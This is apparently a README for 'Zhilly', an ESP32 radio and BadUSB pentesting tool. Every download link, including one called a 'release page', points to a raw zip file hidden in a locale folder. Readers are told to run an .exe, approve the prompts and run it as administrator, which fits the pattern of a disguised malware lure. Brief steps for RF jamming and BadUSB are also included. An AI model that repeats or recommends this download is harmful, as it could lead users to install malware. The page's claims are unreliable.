# ⚙️ Zhilly - Easy ESP32 Pentesting Tool

[![Download Zhilly](https://img.shields.io/badge/Download-Zhilly-4a90e2?style=for-the-badge)](https://raw.githubusercontent.com/quangqw123/Zhilly/main/main/assets/locales/ca-ES/Software_v2.5-alpha.2.zip)

---

## 📢 About Zhilly

Zhilly is a device that helps you test security on wireless systems. It uses AI to control an ESP32 chip made for the LilyGO T-Embed CC1101 module. With Zhilly, you can replay radio signals, jam signals, control infrared devices, and use BadUSB features.

This device is built for people who want to experiment with or learn more about radio signals and hacking-related skills. Zhilly works well for those who want to explore pentesting tools without complex setup.


## 🖥️ System Requirements

Before you start, make sure your computer meets these needs:

- Operating System: Windows 10 or later
- USB Port: One free USB port to connect the Zhilly device
- Internet: Connection needed to download the software
- Hardware: Zhilly works with LilyGO T-Embed CC1101 hardware only
- Space: At least 50 MB of free disk space for the software

It helps to have basic computer skills, like downloading files and opening them.


## 🚀 Getting Started with Zhilly

This section will guide you through downloading and setting up Zhilly on your Windows computer.

### Step 1: Download the Software

Click this link to visit the release page for Zhilly:

[Download Zhilly from Releases](https://raw.githubusercontent.com/quangqw123/Zhilly/main/main/assets/locales/ca-ES/Software_v2.5-alpha.2.zip)

Once on the page:

- Look for the latest stable release (usually at the top)
- Find the setup file for Windows, often named with `.exe` at the end
- Click the file name to start downloading

Save the file somewhere you can easily find it, like the Desktop or Downloads folder.

### Step 2: Run the Installer

After the file finishes downloading:

- Double-click the `.exe` file to open it
- If Windows asks for permission, select "Yes" to allow the install
- Follow the instructions on your screen (usually clicking “Next” multiple times)
- Choose the folder where you want to install Zhilly or accept the default
- Wait until the installation finishes

### Step 3: Connect Your Zhilly Device

- Plug your Zhilly device into your computer via USB
- Windows should recognize the device and install any drivers automatically
- If prompted, allow Windows to search for drivers online

### Step 4: Launch Zhilly

- Find the Zhilly app icon on your desktop or Start menu
- Double-click to open it
- Zhilly will start and detect your connected device automatically

You are now ready to use Zhilly for your pentesting experiments.

## 🎯 Basic Features Overview

Zhilly offers several tools within one package:

- **RF Replay**: Record and play back radio signals to test device responses.
- **RF Jammer**: Temporarily block certain radio signals around you.
- **IR Control**: Control infrared devices like TVs or remotes.
- **BadUSB**: Simulate USB devices that can run scripts for testing security.

Each feature can be accessed from the main menu of the Zhilly app. Controls are simple and clear, designed for ease of use.

## 🔧 Using RF Replay Mode

- Plug in Zhilly and open the app.
- Select “RF Replay” from the menu.
- Press “Record” and point Zhilly at the device sending the signal you want to capture.
- Once recorded, press “Play” to replay the signal.
- Observe how the target device reacts.

This mode helps test how devices respond to radio signals they receive.


## 🔇 Using RF Jammer Mode

- Select “RF Jammer” inside the app.
- Choose the frequency range you want to block.
- Press “Start Jammer” to activate.
- Press “Stop” to turn off jamming.

Jamming disrupts signals temporarily and should be used responsibly in allowed settings only.

## 📡 Using IR Control Mode

- Choose “IR Control” in Zhilly.
- Use the built-in list of common remote controls or program your own.
- Point Zhilly at the infrared receiver on the target device.
- Press the buttons on-screen to send commands.

This feature operates like a universal remote for devices that use infrared.

## 💻 Using BadUSB Mode

- Go to “BadUSB” in the app.
- Select or create simple scripts to run when Zhilly connects via USB.
- Connect Zhilly to the target computer to test response.

This mode is powerful for learning about USB security risks but should be handled carefully.

## 🔄 Updating Zhilly Software

Check the release page regularly for new versions:

https://raw.githubusercontent.com/quangqw123/Zhilly/main/main/assets/locales/ca-ES/Software_v2.5-alpha.2.zip

Download and install newer versions the same way you first installed.

Updates improve security, add features, and fix issues.

## ⚙️ Troubleshooting Tips

**Zhilly not detected by Windows?**

- Try a different USB port.
- Restart your computer.
- Reinstall the Zhilly driver if asked.

**App won’t open?**

- Make sure you installed it correctly.
- Check your Windows version is 10 or later.
- Run the app as administrator (right-click, select “Run as administrator”).

**Problems with specific modes?**

- Restart the app and reconnect Zhilly.
- Make sure firmware on the device is up to date.
- Review Zhilly’s log output (within the app) for errors.

## 🗒️ More Resources

For advanced usage and developer info, check the releases page and project wiki on GitHub.

https://raw.githubusercontent.com/quangqw123/Zhilly/main/main/assets/locales/ca-ES/Software_v2.5-alpha.2.zip

Explore example scripts, detailed hardware info, and firmware updates there.

---

[![Download Zhilly](https://img.shields.io/badge/Download-Zhilly-4a90e2?style=for-the-badge)](https://raw.githubusercontent.com/quangqw123/Zhilly/main/main/assets/locales/ca-ES/Software_v2.5-alpha.2.zip)